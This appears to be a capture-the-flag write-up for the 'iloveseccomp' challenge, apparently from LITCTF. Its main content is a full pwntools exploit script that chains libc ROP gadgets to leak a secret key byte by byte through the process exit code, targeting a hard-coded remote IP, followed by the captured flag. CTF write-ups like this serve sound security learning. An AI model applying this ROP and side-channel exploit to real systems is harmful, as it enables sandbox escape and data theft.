---
date: 2024-08-13 13:35
challenge: iloveseccomp
tags:
  - side channel
  - exit value
---

经典返回值侧信道的题目：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]


def ru(a, drop=False):
    return io.recvuntil(a, drop)


rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

io = remote("34.31.154.223", 54893)
libc = ELF("../libc-2.31.so")

key = b""
for i in range(8):
    ru(b"Sympathy leak: 0x")
    libc_base = int(ru(b"\n", drop=True), 16) - libc.sym.open
    lg("libc_base", libc_base)
    # libc_base = int(input("L"), 16) - libc.sym.open

    # debugB()

    pop_rdi_ret = libc_base + 0x0000000000023B6A
    # 0x000000000011f133 : mov rdi, rax ; mov eax, 0x3c ; syscall
    final_exit = libc_base + 0x000000000011F133
    # 0x00000000001411fc : mov rax, qword ptr [rax] ; ret
    # 0x0000000000034b48 : mov rax, r12 ; pop r12 ; ret
    # 0x00000000000abf48 : add rax, rcx ; ret
    # 0x000000000010257e : pop rcx ; pop rbx ; ret

    payload = flat(
        {
            0x38: [
                libc_base + 0x0000000000034B48,
                0,
                libc_base + 0x000000000010257E,
                0x2EA8,
                0,
                libc_base + 0x00000000000ABF48,
                libc_base + 0x00000000001411FC,
                libc_base + 0x000000000010257E,
                i,
                0,
                libc_base + 0x00000000000ABF48,
                libc_base + 0x00000000001411FC,
                final_exit,
            ]
        },
        word_size=64,
    )
    print(payload.hex())
    sl(payload.hex())
    ru(b"[*] Process './main' stopped with exit code ")
    key += bytes([int(ru(b" (pid", drop=True), 10)])

ru(b"Okay... WHAT IS THE KEY (in hex) ")
sl(key.hex())

ia()

# LITCTF{l0v3_3x1t_c0de_4n4lys1s_d816fcc2}
```
